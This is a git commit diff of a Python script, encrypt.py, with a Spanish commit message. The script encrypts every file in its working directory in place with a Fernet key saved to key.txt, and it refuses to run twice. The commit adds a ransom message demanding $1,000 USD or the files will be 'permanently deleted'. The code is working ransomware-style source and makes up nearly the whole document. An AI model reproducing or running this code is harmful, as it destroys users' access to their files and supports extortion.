f09dd6dadcc58642eae964018fab8c55fc315d98
Eriberto-SG <eribertosg.dev@gmail.com>
2022-10-30 21:54:02 -0600

    Se agrego la funcionalidad para validar si los archivos ya estan o no encriptados, en caso de que no se encriptan. Se agrego un msj de avertencia

--- encrypt.py
+++ encrypt.py
@@ -1,34 +1,43 @@
 import os
+import sys
 from cryptography.fernet import Fernet
 
-# *Find files in the current directory
+# * Find files in the current directory, add them to a list and encrypt them
 
 files = []
 
-for file in os.listdir():
-    if file == "encrypt.py" or file == "decrypt.py" or file == ".gitignore" or file == "key.txt":
-        continue
-    if os.path.isfile(file):
-        files.append(file)
+ignoredFiles = [os.path.basename(__file__), 'decrypt.py', '.gitignore']
 
-#* Library to encrypt files with random key
+
+# * Bucle para descubrir archivos en un directorio
+if os.path.exists('key.txt') == True:
+    print("The key.txt file already exists cannot encrypt files again")
+    sys.exit()
+else:
+    for file in os.listdir():
+        # * Add the files to the array as long as they are not encrypted
+        if os.path.isfile(file) and file not in ignoredFiles:
+            files.append(file)
+
+# * Library to encrypt files with random key
 
 key = Fernet.generate_key()
 
-#* Creating a file to save the generated password
+# * Creating a file to save the generated password
 
-with open("key.txt", "wb") as allKeys: 
+with open("key.txt", "wb") as allKeys:
     allKeys.write(key)
 
 #! Loop to encrypt file content
-for file in files: 
-    with open(file, "rb") as readFile: 
+for file in files:
+    with open(file, "rb") as readFile:
         contents = readFile.read()
         contents_encryted = Fernet(key).encrypt(contents)
-    with open(file, "wb") as writeFile: 
+    with open(file, "wb") as writeFile:
         writeFile.write(contents_encryted)
 
 #! Listing encrypted files
-for file in files: 
+for file in files:
     print("Encrypted: ", file)
 print("Number of encrypted files: ", len(files))
+print("-----Your files have been encrypted, send $1,000 USD or they will be permanently deleted----")
